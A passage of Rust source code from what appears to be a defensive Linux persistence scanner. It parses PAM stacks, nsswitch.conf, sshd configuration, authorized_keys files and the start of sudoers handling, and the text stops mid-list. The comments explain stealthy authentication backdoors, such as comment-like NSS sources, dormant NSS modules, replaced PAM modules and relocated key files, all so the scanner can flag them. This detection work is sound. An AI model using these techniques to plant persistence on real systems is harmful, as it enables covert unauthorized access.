//! Authentication-path persistence: PAM stacks, SSH login material, sudoers.
//!
//! Three mechanism classes in one collector because they share their source
//! material's shape: line-oriented text read at credential time. Every parser
//! here works over bytes and converts to String only at the field boundary, so
//! a rule carrying invalid UTF-8 survives as evidence rather than becoming
//! replacement characters.

use std::collections::{BTreeMap, BTreeSet};
use std::ffi::{OsStr, OsString};
use std::os::unix::ffi::{OsStrExt, OsStringExt};
use std::path::{Path, PathBuf};

use super::{expand_glob, glob_match, include_rel};
use crate::entry::{Enablement, Entry, Flag, Kind, Trigger, dedup_ids};
use crate::scan::{Collector, Ctx};

pub struct Auth;

impl Collector for Auth {
    fn name(&self) -> &'static str {
        "auth"
    }

    fn collect(&self, cx: &mut Ctx) -> Vec<Entry> {
        let mut out = Vec::new();
        pam(cx, &mut out);
        nss(cx, &mut out);
        ssh(cx, &mut out);
        sudoers(cx, &mut out);
        sudo_conf(cx, &mut out);
        dedup_ids(&mut out);
        out
    }
}

// ---------------------------------------------------------------- byte tools

fn is_ws(b: u8) -> bool {
    matches!(b, b' ' | b'\t' | b'\r' | 0x0b | 0x0c)
}

fn trim(mut s: &[u8]) -> &[u8] {
    while let [f, rest @ ..] = s {
        if is_ws(*f) {
            s = rest;
        } else {
            break;
        }
    }
    while let [rest @ .., l] = s {
        if is_ws(*l) {
            s = rest;
        } else {
            break;
        }
    }
    s
}

fn words(s: &[u8]) -> Vec<&[u8]> {
    s.split(|b| is_ws(*b)).filter(|w| !w.is_empty()).collect()
}

fn lossy(s: &[u8]) -> String {
    String::from_utf8_lossy(s).into_owned()
}

fn eqi(a: &[u8], b: &str) -> bool {
    a.eq_ignore_ascii_case(b.as_bytes())
}

fn split_once(s: &[u8], b: u8) -> Option<(&[u8], &[u8])> {
    let i = s.iter().position(|c| *c == b)?;
    Some((&s[..i], &s[i + 1..]))
}

/// A path built from the original bytes, not from a lossy decode: a target
/// whose name is not UTF-8 is still the path the mechanism will execute.
fn bpath(b: &[u8]) -> PathBuf {
    PathBuf::from(OsString::from_vec(b.to_vec()))
}

/// The executable a command line names, where it names one syntactically.
fn first_path(cmd: &[u8]) -> Option<PathBuf> {
    let w = words(cmd).into_iter().next()?;
    w.contains(&b'/').then(|| bpath(w))
}

fn join_ws(parts: &[&[u8]]) -> Vec<u8> {
    let mut v = Vec::new();
    for (i, p) in parts.iter().enumerate() {
        if i > 0 {
            v.push(b' ');
        }
        v.extend_from_slice(p);
    }
    v
}

/// Physical lines joined across a trailing backslash, the continuation rule
/// both pam.conf and sudoers use.
fn logical_lines(bytes: &[u8]) -> Vec<Vec<u8>> {
    let mut out: Vec<Vec<u8>> = Vec::new();
    let mut open = false;
    for raw in bytes.split(|b| *b == b'\n') {
        let line = raw.strip_suffix(b"\r").unwrap_or(raw);
        let joined = line.iter().rev().take_while(|b| **b == b'\\').count() % 2 == 1;
        let body = if joined { &line[..line.len() - 1] } else { line };
        match out.last_mut() {
            Some(prev) if open => prev.extend_from_slice(body),
            _ => out.push(body.to_vec()),
        }
        open = joined;
    }
    out
}

fn hash12(s: &[u8]) -> String {
    blake3::hash(s).to_hex()[..12].to_string()
}

/// A stable, whitespace-insensitive rendering of a rule, so that reindenting a
/// file does not re-identify every entry in it.
fn normalized(line: &[u8]) -> Vec<u8> {
    join_ws(&words(line))
}

fn append_note(e: &mut Entry, key: &str, value: impl Into<String>) {
    let v = value.into();
    match e.raw.get(key) {
        Some(prev) => {
            let merged = format!("{prev}, {v}");
            e.note(key, merged);
        }
        None => e.note(key, v),
    }
}

fn flag_non_utf8(e: &mut Entry, bytes: &[u8]) {
    if std::str::from_utf8(bytes).is_err() {
        e.flag(Flag::EncodingAnomaly);
    }
}

// ------------------------------------------------------------------- part A

/// Where a bare `pam_unix.so` resolves. libpam looks in one directory, the
/// one it was built with; the multiarch and lib64 ones come first so that a
/// copy planted in an unused /lib/security is not taken for the real module.
const PAM_STD_DIRS: &[&str] = &[
    "lib/x86_64-linux-gnu/security",
    "usr/lib/x86_64-linux-gnu/security",
    "lib/aarch64-linux-gnu/security",
    "usr/lib/aarch64-linux-gnu/security",
    "lib64/security",
    "usr/lib64/security",
    "lib/security",
    "usr/lib/security",
];

/// libpam's module directory on this root: the first standard one holding
/// pam_permit.so, which every PAM installation ships.
fn pam_module_dir(cx: &Ctx) -> Option<&'static str> {
    PAM_STD_DIRS.iter().copied().find(|d| cx.root.exists(Path::new(d).join("pam_permit.so")))
}

fn pam_type(t: &[u8]) -> Option<&'static str> {
    // A leading '-' means "skip silently if the module is missing".
    let t = t.strip_prefix(b"-").unwrap_or(t);
    ["auth", "account", "session", "password"].into_iter().find(|n| eqi(t, n))
}

/// Whitespace-separated, except that a bracketed control expression such as
/// `[success=1 default=ignore]` is one token however many spaces it contains.
fn pam_tokens(line: &[u8]) -> Vec<&[u8]> {
    let mut out = Vec::new();
    let mut i = 0;
    while i < line.len() {
        while i < line.len() && is_ws(line[i]) {
            i += 1;
        }
        if i >= line.len() {
            break;
        }
        let start = i;
        if line[i] == b'[' {
            i += 1;
            while i < line.len() && line[i] != b']' {
                i += 1;
            }
            if i < line.len() {
                i += 1;
            }
        } else {
            while i < line.len() && !is_ws(line[i]) {
                i += 1;
            }
        }
        out.push(&line[start..i]);
    }
    out
}

fn module_is_standard(module: &[u8]) -> bool {
    if !module.contains(&b'/') {
        return true;
    }
    let p = bpath(module);
    let Some(dir) = p.parent() else { return false };
    let dir = dir.strip_prefix("/").unwrap_or(dir);
    PAM_STD_DIRS.iter().any(|d| Path::new(d) == dir)
}

fn is_pam_exec_opt(a: &[u8]) -> bool {
    const OPTS: &[&str] = &[
        "debug",
        "quiet",
        "seteuid",
        "expose_authtok",
        "use_first_pass",
        "stdout",
        "stderr",
        "quiet_fail",
        "quiet_success",
    ];
    OPTS.iter().any(|o| eqi(a, o)) || a.starts_with(b"log=") || a.starts_with(b"type=")
}

/// The databases glibc reads from nsswitch.conf (nss/databases.def). A line
/// naming any other, `sudoers:` or `automount:` among them, is read by some
/// other program with its own backends and loads no libnss module.
const NSS_DATABASES: [&[u8]; 17] = [
    b"aliases",
    b"ethers",
    b"group",
    b"group_compat",
    b"gshadow",
    b"hosts",
    b"initgroups",
    b"netgroup",
    b"networks",
    b"passwd",
    b"passwd_compat",
    b"protocols",
    b"publickey",
    b"rpc",
    b"services",
    b"shadow",
    b"shadow_compat",
];

/// Where the loader finds a library named without a slash once its cache has
/// no answer, by layout: Debian's multiarch directories, or Fedora's lib64.
const LOADER_DIRS: [&[&str]; 3] = [
    &["lib/x86_64-linux-gnu", "usr/lib/x86_64-linux-gnu", "lib", "usr/lib"],
    &["lib/aarch64-linux-gnu", "usr/lib/aarch64-linux-gnu", "lib", "usr/lib"],
    &["lib64", "usr/lib64"],
];

/// Tried before each directory itself; which ones apply depends on the CPU.
const HWCAPS: [&str; 3] = ["glibc-hwcaps/x86-64-v4", "glibc-hwcaps/x86-64-v3", "glibc-hwcaps/x86-64-v2"];

/// nsswitch.conf, parsed as glibc 2.39 parses it (nss_database.c,
/// nss_action_parse.c): a database name ends at whitespace or `:`, any run
/// of both follows it, and each source is the bytes up to whitespace or `[`,
/// with an optional bracketed action list. There is no comment syntax after
/// the database name: `passwd: files # nis` makes `#` and `nis` sources, and
/// glibc loads libnss_#.so.2 and libnss_nis.so.2. A line only reads as a
/// comment because `#...` is not a database.
///
/// Each module is loaded into whatever process does a lookup: sshd, sudo,
/// login, cron. One entry per module, with the databases that name it.
fn nss(cx: &mut Ctx, out: &mut Vec<Entry>) {
    let rel = Path::new("etc/nsswitch.conf");
    let Some(bytes) = cx.read_capped(rel, 64 * 1024) else { return };
    let mut modules: Vec<(Vec<u8>, Vec<String>, bool)> = Vec::new();
    for raw in bytes.split(|b| *b == b'\n') {
        let line = raw.trim_ascii_start();
        let end = line.iter().position(|b| b.is_ascii_whitespace() || *b == b':').unwrap_or(line.len());
        let (db, mut rest) = line.split_at(end);
        if db.is_empty() || rest.is_empty() || !NSS_DATABASES.contains(&db) {
            continue;
        }
        let skip = rest.iter().position(|b| !b.is_ascii_whitespace() && *b != b':').unwrap_or(rest.len());
        rest = &rest[skip..];
        let mut after_hash = false;
        loop {
            rest = rest.trim_ascii_start();
            if rest.is_empty() {
                break;
            }
            let end = rest.iter().position(|b| b.is_ascii_whitespace() || *b == b'[').unwrap_or(rest.len());
            let name = &rest[..end];
            rest = rest[end..].trim_ascii_start();
            if rest.first() == Some(&b'[') {
                rest = &rest[rest.iter().position(|b| *b == b']').map_or(rest.len(), |i| i + 1)..];
            }
            if name.is_empty() {
                continue;
            }
            after_hash |= name.starts_with(b"#");
            // Built into libc since 2.34; no library is opened for them.
            if name == b"files" || name == b"dns" {
                continue;
            }
            let db = lossy(db);
            match modules.iter_mut().find(|m| m.0 == name) {
                Some(m) => {
                    if !m.1.contains(&db) {
                        m.1.push(db);
                    }
                    m.2 |= after_hash;
                }
                None => modules.push((name.to_vec(), vec![db], after_hash)),
            }
        }
    }
    if modules.is_empty() {
        return;
    }

    let mut dirs: Vec<String> = super::ld_so_conf_dirs(cx).into_iter().map(|(d, _)| d).collect();
    let layout = LOADER_DIRS.iter().find(|l| cx.root.exists(l[0])).copied().unwrap_or(&[]);
    dirs.extend(layout.iter().map(|d| format!("/{d}")));
    for (name, databases, after_hash) in modules {
        let file = [b"libnss_".as_slice(), &name, b".so.2"].concat();
        let file = Path::new(OsStr::from_bytes(&file));
        // ponytail: the loader's cache is not read; ld.so.conf's directories
        // stand in for it, ahead of the defaults, as the cache is consulted
        // first.
        // Merged /usr makes /lib/x and /usr/lib/x one directory, searched
        // once under the first name.
        let mut seen = BTreeSet::new();
        let mut found: Vec<PathBuf> = Vec::new();
        for d in &dirs {
            let d = Path::new(d.trim_start_matches('/'));
            for dir in HWCAPS.iter().map(|h| d.join(h)).chain(std::iter::once(d.to_path_buf())) {
                let Ok(id) = cx.root.dir_identity(&dir) else { continue };
                if seen.insert(id) && cx.root.exists(dir.join(file)) {
                    found.push(dir.join(file));
                }
            }
        }
        let mut e = cx.entry(Kind::NssModule, rel, lossy(&name));
        e.trigger = Trigger::Always;
        e.note("databases", databases.join(", "));
        e.note("library", file.to_string_lossy());
        if after_hash {
            // What reads as a comment to a person is a source to glibc.
            e.note("after_hash", "true");
        }
        match found.first() {
            Some(lib) => {
                e.enabled = Enablement::Enabled;
                e.target_path = Some(cx.root.abs(lib));
                if found.len() > 1 {
                    let all: Vec<String> = found.iter().map(|p| cx.root.abs(p).display().to_string()).collect();
                    e.note("candidates", all.join(", "));
                }
            }
            // glibc skips a source whose library is missing, silently. Stock
            // Ubuntu names nis with no libnss_nis installed: dormant, and a
            // library dropped under that name starts loading.
            None => {
                e.enabled = Enablement::Disabled;
                e.note("library_missing", "true");
            }
        }
        if std::str::from_utf8(&name).is_err() {
            e.flag(Flag::EncodingAnomaly);
        }
        out.push(e);
    }
}

/// libpam reads a service's stack from /etc/pam.d, and from the vendor
/// directory only when /etc/pam.d has no file of that name.
const PAM_DIRS: [&str; 2] = ["etc/pam.d", "usr/lib/pam.d"];

fn pam(cx: &mut Ctx, out: &mut Vec<Entry>) {
    let module_dir = pam_module_dir(cx);
    let mut files = vec![(PathBuf::from("etc/pam.conf"), None)];
    // Each service's files, the one libpam uses first.
    let mut copies: BTreeMap<OsString, Vec<PathBuf>> = BTreeMap::new();
    for dir in PAM_DIRS {
        for ent in cx.dir(dir) {
            if !ent.is_dir {
                let rel = Path::new(dir).join(&ent.name);
                copies.entry(ent.name.clone()).or_default().push(rel.clone());
                files.push((rel, Some(ent.name)));
            }
        }
    }

    for (rel, service_file) in files {
        let Some(bytes) = cx.read(&rel) else { continue };
        // A vendor stack replaced by one in /etc never runs. It is still
        // reported, off, so the replacement does not read as a second stack.
        let others = service_file.and_then(|n| copies.get(&n)).filter(|c| c.len() > 1);
        let shown = |p: &PathBuf| cx.root.abs(p).display().to_string();
        let (shadowed_by, shadows) = match others {
            Some(c) if c[0] != rel => (Some(shown(&c[0])), None),
            Some(c) => (None, Some(c[1..].iter().map(shown).collect::<Vec<_>>().join(", "))),
            None => (None, None),
        };
        let filename = rel.file_name().map(|n| lossy(n.as_encoded_bytes())).unwrap_or_default();

        for line in logical_lines(&bytes) {
            let toks = pam_tokens(&line);
            if toks.is_empty() || toks[0].first() == Some(&b'#') {
                continue;
            }
            // pam.conf prefixes each rule with its service name; pam.d takes
            // the service from the filename. Detect which by where the type is.
            let (service, rule) = if pam_type(toks[0]).is_some() {
                (filename.clone(), &toks[..])
            } else if toks.len() > 1 && pam_type(toks[1]).is_some() {
                (lossy(toks[0]), &toks[1..])
            } else {
                continue;
            };
            if rule.len() < 3 {
                continue;
            }
            let Some(mtype) = pam_type(rule[0]) else { continue };
            let (control, module, args) = (rule[1], rule[2], &rule[3..]);

            let base = module.rsplit(|b| *b == b'/').next().unwrap_or(module);
            let prog = if eqi(base, "pam_exec.so") {
                args.iter().position(|a| !is_pam_exec_opt(a))
            } else {
                None
            };
            let nonstandard = !module_is_standard(module);

            let name = match prog {
                Some(i) => format!("{service}:{mtype}:{}:{}", lossy(module), lossy(args[i])),
                None => format!("{service}:{mtype}:{}", lossy(module)),
            };
            let mut e = cx.entry(Kind::Pam, &rel, name);
            e.trigger = Trigger::Auth;
            e.enabled = if shadowed_by.is_some() { Enablement::Disabled } else { Enablement::Enabled };
            if let Some(by) = &shadowed_by {
                e.note("shadowed_by", by.clone());
            }
            if let Some(paths) = &shadows {
                e.note("shadows", paths.clone());
            }
            e.note("service", service);
            e.note("module_type", mtype);
            e.note("control", lossy(control));
            e.note("module", lossy(module));
            if !args.is_empty() {
                e.note("module_args", lossy(&join_ws(args)));
            }
            if nonstandard {
                e.flag(Flag::NonStandardLocation);
                e.target_path = Some(bpath(module));
            } else {
                // Every module a stack loads is checked against its package:
                // a replaced pam_unix.so sits in the standard directory and
                // is otherwise indistinguishable from the real one.
                let rel = match (module.contains(&b'/'), module_dir) {
                    (true, _) => Some(bpath(module).strip_prefix("/").map(Path::to_path_buf).unwrap_or_else(|_| bpath(module))),
                    (false, Some(dir)) => Some(Path::new(dir).join(bpath(module))),
                    (false, None) => None,
                };
                match rel {
                    Some(rel) if cx.root.exists(&rel) => e.target_path = Some(cx.root.abs(&rel)),
                    // libpam fails the line, or skips it under a leading `-`;
                    // a module that is not there runs nothing.
                    _ => e.note("module_missing", "true"),
                }
            }
            if let Some(i) = prog {
                // pam_exec execs argv directly, so rejoining the argument
                // vector with single spaces is a faithful rendering of it.
                e.command = Some(join_ws(&args[i..]));
                e.target_path = Some(bpath(args[i]));
                for opt in ["seteuid", "quiet", "stdout", "stderr", "expose_authtok", "debug"] {
                    if args[..i].iter().any(|a| eqi(a, opt)) {
                        e.note(&format!("pam_exec.{opt}"), "true");
                    }
                }
                for a in &args[..i] {
                    if let Some(v) = a.strip_prefix(b"log=") {
                        e.note("pam_exec.log", lossy(v));
                    }
                }
            }
            flag_non_utf8(&mut e, &line);
            out.push(e);
        }
    }
}

// ------------------------------------------------------------------- part B

struct KeyLine<'a> {
    options: Option<&'a [u8]>,
    keytype: &'a [u8],
    blob: &'a [u8],
    comment: &'a [u8],
}

fn is_key_type(t: &[u8]) -> bool {
    const P: &[&str] = &["ssh-", "ecdsa-", "sk-ecdsa-", "sk-ssh-", "rsa-sha2-", "webauthn-sk-"];
    P.iter().any(|p| t.len() > p.len() && t[..p.len()].eq_ignore_ascii_case(p.as_bytes()))
}

/// End of the first field, honouring OpenSSH's quoting: an option value may
/// contain spaces, commas and `\"`, and none of them end the options list.
fn quoted_token_end(s: &[u8]) -> usize {
    let mut i = 0;
    let mut quoted = false;
    while i < s.len() {
        match s[i] {
            b'"' => quoted = !quoted,
            b'\\' if quoted && s.get(i + 1) == Some(&b'"') => i += 1,
            c if is_ws(c) && !quoted => break,
            _ => {}
        }
        i += 1;
    }
    i
}

fn parse_key_line(line: &[u8]) -> Option<KeyLine<'_>> {
    let end = quoted_token_end(line);
    let (options, rest) = if is_key_type(&line[..end]) {
        (None, line)
    } else {
        (Some(&line[..end]), trim(&line[end..]))
    };
    let t1 = rest.iter().position(|b| is_ws(*b))?;
    let keytype = &rest[..t1];
    if !is_key_type(keytype) {
        return None;
    }
    let r2 = trim(&rest[t1..]);
    let t2 = r2.iter().position(|b| is_ws(*b)).unwrap_or(r2.len());
    let blob = &r2[..t2];
    if blob.is_empty() {
        return None;
    }
    Some(KeyLine { options, keytype, blob, comment: trim(&r2[t2..]) })
}

/// The comma-separated option list. Values may be bare or double-quoted, and a
/// quoted value may contain commas and spaces; `\"` is the only escape
/// OpenSSH recognises inside one.
fn parse_options(s: &[u8]) -> Vec<(Vec<u8>, Option<Vec<u8>>)> {
    let mut out = Vec::new();
    let mut i = 0;
    while i < s.len() {
        while i < s.len() && (s[i] == b',' || is_ws(s[i])) {
            i += 1;
        }
        if i >= s.len() {
            break;
        }
        let start = i;
        while i < s.len() && s[i] != b'=' && s[i] != b',' {
            i += 1;
        }
        let name = s[start..i].to_vec();
        let mut value = None;
        if s.get(i) == Some(&b'=') {
            i += 1;
            if s.get(i) == Some(&b'"') {
                i += 1;
                let mut v = Vec::new();
                while i < s.len() && s[i] != b'"' {
                    if s[i] == b'\\' && s.get(i + 1) == Some(&b'"') {
                        i += 1;
                    }
                    v.push(s[i]);
                    i += 1;
                }
                i += 1; // past the closing quote, or past the end if unterminated
                value = Some(v);
            } else {
                let vs = i;
                while i < s.len() && s[i] != b',' {
                    i += 1;
                }
                value = Some(s[vs..i].to_vec());
            }
        }
        out.push((name, value));
    }
    out
}

fn b64_decode(s: &[u8]) -> Option<Vec<u8>> {
    let mut out = Vec::with_capacity(s.len() / 4 * 3);
    let mut acc: u32 = 0;
    let mut bits = 0;
    for &c in s {
        if c == b'=' {
            break;
        }
        let v = match c {
            b'A'..=b'Z' => c - b'A',
            b'a'..=b'z' => c - b'a' + 26,
            b'0'..=b'9' => c - b'0' + 52,
            b'+' => 62,
            b'/' => 63,
            _ => return None,
        } as u32;
        acc = (acc << 6) | v;
        bits += 6;
        if bits >= 8 {
            bits -= 8;
            out.push((acc >> bits) as u8);
        }
    }
    Some(out)
}

fn b64_encode(b: &[u8]) -> String {
    const T: &[u8; 64] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut s = String::with_capacity(b.len().div_ceil(3) * 4);
    for c in b.chunks(3) {
        let n = (c[0] as u32) << 16
            | (*c.get(1).unwrap_or(&0) as u32) << 8
            | *c.get(2).unwrap_or(&0) as u32;
        for i in 0..c.len() + 1 {
            s.push(T[(n >> (18 - 6 * i) & 63) as usize] as char);
        }
    }
    s
}

/// The identity of a key is the key, never its position in the file. This is
/// the same value `ssh-keygen -lf` prints, so an operator can match it against
/// a key inventory directly.
fn fingerprint(blob: &[u8]) -> (String, bool) {
    match b64_decode(blob) {
        Some(raw) if !raw.is_empty() => {
            use sha2::{Digest, Sha256};
            (format!("SHA256:{}", b64_encode(&Sha256::digest(&raw))), true)
        }
        _ => (format!("key:{}", hash12(blob)), false),
    }
}

/// sshd's default when no AuthorizedKeysFile is given.
const DEFAULT_KEY_FILES: &str = ".ssh/authorized_keys .ssh/authorized_keys2";

/// Where sshd looks for a user's keys, gathered while its configuration is
/// read. sshd takes the first value it obtains for a keyword; a Match block's
/// value applies only to what the block matches, so each is kept with its
/// criteria.
#[derive(Default)]
struct KeyFiles {
    global: Option<String>,
    scoped: Vec<(String, String)>,
}

fn ssh(cx: &mut Ctx, out: &mut Vec<Entry>) {
    let mut seen: BTreeSet<PathBuf> = BTreeSet::new();
    let mut keys = KeyFiles::default();
    sshd_config_file(cx, out, Path::new("etc/ssh/sshd_config"), None, 1, &mut seen, &mut keys);
    for ent in cx.dir("etc/ssh/sshd_config.d") {
        if ent.is_dir {
            continue;
        }
        let rel = Path::new("etc/ssh/sshd_config.d").join(&ent.name);
        sshd_config_file(cx, out, &rel, None, 0, &mut seen, &mut keys);
    }

    login_script(cx, out, Path::new("etc/ssh/sshrc"), "sshrc", None);

    let users = cx.users;
    let mut homes: BTreeSet<PathBuf> = BTreeSet::new();
    for u in users {
        if !homes.insert(u.home.clone()) {
            continue;
        }
        // The files AuthorizedKeysFile names for this account. The default
        // files are reported even where it names others, since a key left
        // in one is evidence, but as not read.
        let global = keys.global.clone().unwrap_or_else(|| DEFAULT_KEY_FILES.to_string());
        let mut files: Vec<(PathBuf, Option<String>)> =
            key_file_paths(&global, u).into_iter().map(|p| (p, None)).collect();
        for (criteria, value) in &keys.scoped {
            if match_may_apply(criteria, &u.name) {
                files.extend(key_file_paths(value, u).into_iter().map(|p| (p, Some(criteria.clone()))));
            }
        }
        for (rel, scope) in &files {
            authorized_keys(cx, out, rel, &u.name, Enablement::Enabled, scope.as_deref());
        }
        for f in [".ssh/authorized_keys", ".ssh/authorized_keys2"] {
            let rel = u.in_home(f);
            if !files.iter().any(|(p, _)| *p == rel) {
                authorized_keys(cx, out, &rel, &u.name, Enablement::Disabled, None);
            }
        }
        login_script(cx, out, &u.in_home(".ssh/rc"), "ssh-rc", Some(&u.name));
        user_environment(cx, out, &u.in_home(".ssh/environment"), &u.name);
    }
}

/// The root-relative files an AuthorizedKeysFile value names for one
/// account: whitespace-separated, `%%`, `%h`, `%u` and `%U` expanded, a
/// relative path taken from the home, `none` naming nothing.
fn key_file_paths(value: &str, u: &crate::users::User) -> Vec<PathBuf> {
    let home = format!("/{}", u.home.display());
    let uid = u.uid.map(|n| n.to_string()).unwrap_or_default();
    value
        .split_whitespace()
        .filter(|t| !t.eq_ignore_ascii_case("none"))
        .map(|t| {
            let mut expanded = String::new();
            let mut chars = t.chars();
            while let Some(c) = chars.next() {
                match (c, chars.clone().next()) {
                    ('%', Some(k @ ('%' | 'h' | 'u' | 'U'))) => {
                        chars.next();
                        expanded.push_str(match k {
                            '%' => "%",
                            'h' => &home,
                            'u' => &u.name,
                            _ => &uid,
                        });
                    }
                    _ => expanded.push(c),
                }
            }
            match expanded.strip_prefix('/') {
                Some(abs) => PathBuf::from(abs.trim_start_matches('/')),
                None => u.in_home(&expanded),
            }
        })
        .collect()
}

/// Whether a Match block could apply to this account. `User` lists are
/// matched as sshd matches them, `!` negating; any other criterion (Group,
/// Host, Address) depends on the connection, so it may.
fn match_may_apply(criteria: &str, user: &str) -> bool {
    let w: Vec<&str> = criteria.split_whitespace().collect();
    match w.as_slice() {
        [kw, list] if kw.eq_ignore_ascii_case("user") => {
            let pats: Vec<&str> = list.split(',').collect();
            let hit = |p: &str| glob_match(p.as_bytes(), user.as_bytes());
            !pats.iter().any(|p| p.strip_prefix('!').is_some_and(hit))
                && pats.iter().any(|p| !p.starts_with('!') && hit(p))
        }
        _ => true,
    }
}

fn authorized_keys(
    cx: &mut Ctx,
    out: &mut Vec<Entry>,
    rel: &Path,
    user: &str,
    enabled: Enablement,
    scope: Option<&str>,
) {
    let Some(bytes) = cx.read(rel) else { return };
    for line in bytes.split(|b| *b == b'\n') {
        let line = trim(line);
        if line.is_empty() || line[0] == b'#' {
            continue;
        }
        let Some(k) = parse_key_line(line) else { continue };
        let (fp, decoded) = fingerprint(k.blob);

        let mut e = cx.entry(Kind::SshAuthorizedKey, rel, fp);
        e.trigger = Trigger::Login;
        e.enabled = enabled;
        e.principal = Some(user.to_string());
        e.note("ssh_mechanism", "authorized-key");
        if enabled == Enablement::Disabled {
            e.note("not_read", "AuthorizedKeysFile names other files");
        }
        if let Some(m) = scope {
            e.note("match", m);
        }
        e.note("key_type", lossy(k.keytype));
        if !k.comment.is_empty() {
            e.note("comment", lossy(k.comment));
        }
        if !decoded {
            e.note("key_blob_unparsed", "true");
        }
        if let Some(opts) = k.options {
            e.note("options", lossy(opts));
            for (name, value) in parse_options(opts) {
                let name = lossy(&name).to_ascii_lowercase();
                match (name.as_str(), value) {
                    ("command", Some(v)) => {
                        e.target_path = first_path(&v);
                        e.command = Some(v);
                    }
                    ("environment", Some(v)) => match split_once(&v, b'=') {
                        Some((k, val)) => e.note(&format!("env.{}", lossy(k)), lossy(val)),
                        None => append_note(&mut e, "opt.environment", lossy(&v)),
                    },
                    (_, Some(v)) => append_note(&mut e, &format!("opt.{name}"), lossy(&v)),
                    (_, None) => append_note(&mut e, &format!("opt.{name}"), "true"),
                }
            }
        }
        flag_non_utf8(&mut e, line);
        out.push(e);
    }
}

/// `/etc/ssh/sshrc` and `~/.ssh/rc`: sshd runs these on every login, so their
/// presence is the entry. The command is the script itself.
fn login_script(cx: &mut Ctx, out: &mut Vec<Entry>, rel: &Path, name: &str, user: Option<&str>) {
    if !cx.root.exists(rel) {
        return;
    }
    let mut e = cx.entry(Kind::SshAuthorizedKey, rel, name);
    e.trigger = Trigger::Login;
    e.enabled = Enablement::Enabled;
    e.principal = user.map(str::to_string);
    e.target_path = Some(cx.root.abs(rel));
    e.note("ssh_mechanism", "login-script");
    out.push(e);
}

/// `~/.ssh/environment` is inert unless sshd carries PermitUserEnvironment,
/// which is why the file is reported with its enablement unresolved.
fn user_environment(cx: &mut Ctx, out: &mut Vec<Entry>, rel: &Path, user: &str) {
    let Some(bytes) = cx.read(rel) else { return };
    let mut e = cx.entry(Kind::SshAuthorizedKey, rel, "ssh-environment");
    e.trigger = Trigger::Login;
    e.enabled = Enablement::Unknown;
    e.principal = Some(user.to_string());
    e.note("ssh_mechanism", "user-environment");
    e.note("depends_on", "PermitUserEnvironment");
    for line in bytes.split(|b| *b == b'\n') {
        let line = trim(line);
        if line.is_empty() || line[0] == b'#' {
            continue;
        }
        if let Some((k, v)) = split_once(line, b'=') {
            e.note(&format!("env.{}", lossy(trim(k))), lossy(trim(v)));
        }
    }
    flag_non_utf8(&mut e, &bytes);
    out.push(e);
}

/// Keyword and value. sshd_config accepts whitespace or `=` as the separator,
/// matches keywords case-insensitively, and treats `#` as a comment only at
/// the start of a line — a trailing `# note` is part of the value.
fn sshd_kv(line: &[u8]) -> Option<(&[u8], &[u8])> {
    let line = trim(line);
    if line.is_empty() || line[0] == b'#' {
        return None;
    }
    let mut i = 0;
    while i < line.len() && !is_ws(line[i]) && line[i] != b'=' {
        i += 1;
    }
    let keyword = &line[..i];
    while i < line.len() && is_ws(line[i]) {
        i += 1;
    }
    if line.get(i) == Some(&b'=') {
        i += 1;
        while i < line.len() && is_ws(line[i]) {
            i += 1;
        }
    }
    Some((keyword, &line[i..]))
}

/// An include path resolved root-relative: absolute means relative to the scan
/// root, bare means relative to `base`.
fn sshd_config_file(
    cx: &mut Ctx,
    out: &mut Vec<Entry>,
    rel: &Path,
    outer_match: Option<&str>,
    depth: u32,
    seen: &mut BTreeSet<PathBuf>,
    keys: &mut KeyFiles,
) {
    if !seen.insert(rel.to_path_buf()) {
        return;
    }
    let Some(bytes) = cx.read(rel) else { return };
    let mut current: Option<String> = outer_match.map(str::to_string);

    for line in bytes.split(|b| *b == b'\n') {
        let Some((keyword, value)) = sshd_kv(line) else { continue };
        let lower = lossy(keyword).to_ascii_lowercase();
        let canonical = match lower.as_str() {
            "match" => {
                current = Some(lossy(value));
                continue;
            }
            "forcecommand" => "ForceCommand",
            "authorizedkeyscommand" => "AuthorizedKeysCommand",
            "authorizedprincipalscommand" => "AuthorizedPrincipalsCommand",
            "authorizedkeysfile" => "AuthorizedKeysFile",
            "trustedusercakeys" => "TrustedUserCAKeys",
            "permituserenvironment" => "PermitUserEnvironment",
            "include" => "Include",
            "setenv" => "SetEnv",
            _ => continue,
        };
        if canonical == "PermitUserEnvironment" && (value.is_empty() || eqi(value, "no")) {
            continue;
        }

        let scope = current.clone().unwrap_or_else(|| "(global)".to_string());
        let name = match &current {
            Some(m) => format!("{canonical}@{m}"),
            None => canonical.to_string(),
        };
        let mut e = cx.entry(Kind::SshAuthorizedKey, rel, name);
        e.trigger = Trigger::Login;
        e.enabled = Enablement::Enabled;
        e.note("ssh_mechanism", "sshd_config");
        e.note("directive", canonical);
        e.note("match", scope);
        if let Some(m) = &current {
            let w = words(m.as_bytes());
            if w.len() >= 2 && eqi(w[0], "user") {
                e.principal = Some(lossy(w[1]));
            }
        }
        match canonical {
            "ForceCommand" | "AuthorizedKeysCommand" | "AuthorizedPrincipalsCommand" => {
                e.target_path = first_path(value);
                e.command = Some(value.to_vec());
            }
            // Where keys are read from. Moving it is the persistence step:
            // keys in a file nobody audits log in like any other.
            "AuthorizedKeysFile" => {
                let v = lossy(value);
                e.note("value", v.clone());
                match &current {
                    Some(m) => keys.scoped.push((m.clone(), v)),
                    None if keys.global.is_none() => keys.global = Some(v),
                    None => {
                        e.enabled = Enablement::Disabled;
                        e.note("superseded", "sshd takes the first value it obtains");
                    }
                }
            }
            "PermitUserEnvironment" => {
                e.note("value", lossy(value));
            }
            "SetEnv" => {
                for w in words(value) {
                    if let Some((k, v)) = split_once(w, b'=') {
                        e.note(&format!("env.{}", lossy(k)), lossy(v));
                    }
                }
            }
            _ => {
                e.note("value", lossy(value));
                // Include takes a list; the first member is the path.
                e.target_path = words(value).first().map(|w| bpath(w));
            }
        }
        flag_non_utf8(&mut e, line);
        out.push(e);

        // ponytail: Include is followed exactly one level; a second level
        // needs a cycle guard and a depth budget nobody has asked for.
        if canonical == "Include" && depth > 0 {
            let here = current.clone();
            for spec in words(value) {
                let rel = include_rel(Path::new("etc/ssh"), spec);
                for target in expand_glob(cx, &rel) {
                    sshd_config_file(cx, out, &target, here.as_deref(), depth - 1, seen, keys);
                }
            }
        }
    }
}

// ------------------------------------------------------------------- part C

const SUDO_TAGS: &[&str] = &[
    "NOPASSWD",
    "PASSWD",
    "NOEXEC",
    "EXEC",
    "SETENV",
    "NOSETENV",
    "LOG_INPUT",
    "NOLOG_INPUT",
    "LOG_OUTPUT",
    "NOLOG_OUTPUT",
    "FOLLOW",
